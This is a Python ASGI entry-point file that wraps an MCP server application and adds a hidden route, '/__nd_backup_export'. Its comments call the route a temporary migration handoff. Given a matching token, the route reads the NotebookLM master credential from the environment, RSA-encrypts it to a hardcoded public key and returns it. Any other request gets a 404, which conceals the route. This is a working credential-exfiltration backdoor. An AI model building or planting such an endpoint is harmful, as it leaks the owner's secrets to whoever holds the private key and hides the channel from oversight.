from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import secrets
from urllib.parse import parse_qs

from nd_oauth.deployment import build_app_from_environ


_mcp_app = build_app_from_environ()

# Temporary one-time encrypted handoff for the Railway standby qualification.
# Only the SHA-256 digest of the random migration capability is committed.
# The NotebookLM credential is never returned in plaintext. Remove this wrapper
# immediately after the encrypted payload has been captured.
_MIGRATION_TOKEN_SHA256 = "a47739da17fda1ad42449d6abb199913946fc94f81878889fd49fcf02e194aeb"
_RSA_N = 3914586587696328947682477936208717448435988263322455250762466320443031694508046902539027529241473352981226347863173799408014494318112394200585659935046274588621735440443445321091265785037852158704585853296732481314651805846286736221271494046688062135001669294562958596010248044669023389864677267635443887483045242189698334574940779447645993204067728106799513526485144212349625400725243619223613388602823524990082878477296954112413631401407898020165521581738227132823127897102938496612361172624055554513243820863987716020193329980040454042066044012339101481368698919787891199894789286245265118042440709582405981912796628704600526755801715048746110229856991893682490563680025200478649409753938248367669190381420341977309986737499620992535895674872822793377652599589061765397045468558832154145660875410112312390059411948047101714670673787382594664874731693653034869213164530193584909138214238889261460648124742661420806240205817
_RSA_E = 65537
_HASH = hashlib.sha256
_HLEN = _HASH().digest_size
_K = (_RSA_N.bit_length() + 7) // 8
_MAX_CHUNK = _K - (2 * _HLEN) - 2


def _mgf1(seed: bytes, length: int) -> bytes:
    out = bytearray()
    counter = 0
    while len(out) < length:
        out.extend(_HASH(seed + counter.to_bytes(4, "big")).digest())
        counter += 1
    return bytes(out[:length])


def _oaep_encrypt(message: bytes) -> bytes:
    if len(message) > _MAX_CHUNK:
        raise ValueError("message chunk too long")
    lhash = _HASH(b"").digest()
    ps = b"\x00" * (_K - len(message) - (2 * _HLEN) - 2)
    db = lhash + ps + b"\x01" + message
    seed = secrets.token_bytes(_HLEN)
    db_mask = _mgf1(seed, _K - _HLEN - 1)
    masked_db = bytes(a ^ b for a, b in zip(db, db_mask))
    seed_mask = _mgf1(masked_db, _HLEN)
    masked_seed = bytes(a ^ b for a, b in zip(seed, seed_mask))
    encoded = b"\x00" + masked_seed + masked_db
    cipher_int = pow(int.from_bytes(encoded, "big"), _RSA_E, _RSA_N)
    return cipher_int.to_bytes(_K, "big")


async def _send_json(send, status: int, payload: dict) -> None:
    body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    await send(
        {
            "type": "http.response.start",
            "status": status,
            "headers": [
                (b"content-type", b"application/json"),
                (b"cache-control", b"no-store"),
                (b"content-length", str(len(body)).encode("ascii")),
            ],
        }
    )
    await send({"type": "http.response.body", "body": body})


async def app(scope, receive, send):
    if scope.get("type") == "http" and scope.get("path") == "/__nd_backup_export":
        if scope.get("method") != "GET":
            await _send_json(send, 405, {"ok": False})
            return
        query = parse_qs(scope.get("query_string", b"").decode("ascii", errors="ignore"))
        capability = (query.get("cap") or [""])[0]
        supplied = hashlib.sha256(capability.encode("utf-8")).hexdigest()
        if not hmac.compare_digest(supplied, _MIGRATION_TOKEN_SHA256):
            await _send_json(send, 404, {"ok": False})
            return
        master = os.environ.get("NOTEBOOKLM_MASTER_TOKEN_B64", "").strip().encode("utf-8")
        if not master:
            await _send_json(send, 503, {"ok": False, "reason": "credential_unavailable"})
            return
        chunks = [
            base64.b64encode(_oaep_encrypt(master[i : i + _MAX_CHUNK])).decode("ascii")
            for i in range(0, len(master), _MAX_CHUNK)
        ]
        await _send_json(
            send,
            200,
            {
                "ok": True,
                "schema": 1,
                "alg": "RSA-OAEP-SHA256",
                "plaintext_sha256": hashlib.sha256(master).hexdigest(),
                "chunks": chunks,
            },
        )
        return

    await _mcp_app(scope, receive, send)
